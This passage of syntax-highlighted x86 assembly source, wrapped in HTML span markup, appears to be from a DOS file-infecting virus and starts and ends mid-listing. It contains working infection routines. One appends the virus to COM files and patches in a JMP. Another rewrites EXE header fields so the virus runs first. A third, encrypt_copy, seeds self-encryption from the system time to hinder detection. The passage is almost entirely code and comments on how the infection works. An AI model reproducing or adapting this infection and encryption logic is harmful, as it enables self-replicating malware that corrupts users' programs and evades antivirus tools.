         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of data buffer</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; CX = number of bytes to add to f...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = filesize</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000000000001111b</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; CX = number of bytes to add to f...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = filesize</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; AX = offset of virus within file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store offset of virus within file</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">         </span><span class="sc1">; JMP imm16 (opcode 0e9h)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Store JMP imm16</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = filesize</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">      </span><span class="sc1">; Subtract size of opcode JMP imm16</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store 16-bit immediate</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_sof</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">      </span><span class="sc1">; Write three bytes</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file</span><span class="sc0">
</span><span class="sc5">inf_com_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; SP = stack pointer</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Load BP from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">infect_exe</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Infect EXE file</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Save BP at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; BP = stack pointer</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Correct stack pointer</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; EXE executable</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">com_or_exe</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">  </span><span class="sc1">; Store EXE executable</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_eof</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of filesize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Store high-order word of filesize</span><span class="sc0">

         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000000000001111b</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; CX = number of bytes to add to f...</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; CX =   "    "    "   "   "  "   "</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = low-order word of filesize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DX = high-order word of filesize</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Add number of bytes to add to fi...</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Convert to 32-bit</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of pointer ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Store high-order word of pointer...</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file_</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Save BX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = low-order word of pointer t...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DX = high-order word of pointer ...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = header size in paragraphs</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">      </span><span class="sc1">; Divide by four thousand and nine...</span><span class="sc0">
         </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; BX = header size in sixty-five t...</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Subtract header size in sixty fi...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = header size in paragraphs</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Multiply by paragraphs</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; BX = header size</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Subtract header size from filesize</span><span class="sc0">
         </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Convert to 32-bit</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of pointer ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Store high-order word of pointer...</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Load BX from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = original instruction pointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">instruct_ptr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = original code segment</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">code_seg</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; Store original code segment</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store initial IP</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">initial_ip</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; Store   "     "</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = high-order word of pointer ...</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1111111111110000b</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">calc_ins_ptr</span><span class="sc0">    </span><span class="sc1">; Zero? Jump to calc_ins_ptr</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">inf_exe_exit</span><span class="sc0">
</span><span class="sc5">calc_ins_ptr</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Multiply by sixty-five thousand ...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DX = low-order word of pointer t...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Divide by paragraphs</span><span class="sc0">
         </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; DX = low-order word of pointer t...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; AX = initial CS relative to star...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store initial CS relative to sta...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">initial_cs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;   "      "    "     "     "    "</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = initial SS relative to star...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stack_seg</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Store initial SS relative to sta...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = initial SP</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stack_ptr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Store initial SP</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">store_stack</span><span class="sc0">     </span><span class="sc1">; Above or equal? Jump to store_stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">inf_exe_exit</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">store_stack</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store initial SS relative to sta...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; AX = initial SP</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store initial SP</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Save BX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = low-order word of pointer t...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DX = high-order word of pointer ...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = header size in paragraphs</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">      </span><span class="sc1">; Divide by four thousand and nine...</span><span class="sc0">
         </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; BX = header size in sixty-five t...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Add header size in sixty-five th...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = header size in paragraphs</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Multiply by paragraphs</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; BX = header size</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Add header size to filesize</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Convert to 32-bit</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of pointer ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Store high-order word of pointer...</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Load BX from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = low-order word of pointer t...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DX = high-order word of pointer ...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Convet to 32-bit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Multiply by one hundred and twen...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">      </span><span class="sc1">; Divide by pages</span><span class="sc0">
         </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; AX = low-order word of pointer t...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DX = number of bytes on last 512...</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000000000011111b</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">store_pages</span><span class="sc0">     </span><span class="sc1">; Zero? Jump to store_pages</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Increase number of bytes on last...</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_pages_</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">store_pages</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">         </span><span class="sc1">; AX = total number of 512-bytes p...</span><span class="sc0">
</span><span class="sc5">store_pages_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store total number of 512-bytes ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Store number of bytes on last 51...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = maximum paragraphs to alloc...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Maximum paragraphs to allocate ...?</span><span class="sc0">
         </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">store_maximu</span><span class="sc0">    </span><span class="sc1">; Above or equal? Jump to store_ma...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; AX = new maximum paragraphs to a...</span><span class="sc0">
</span><span class="sc5">store_maximu</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store maximum paragraphs to allo...</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_sof</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">; Write thirty-two bytes</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_eof</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt_copy</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file</span><span class="sc0">
</span><span class="sc5">inf_exe_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; SP = stack pointer</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Load BP from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">encrypt_copy</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Move virus to data buffer and en...</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Save BX at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">      </span><span class="sc1">; Get system time</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; BX = hour and minute</span><span class="sc0">
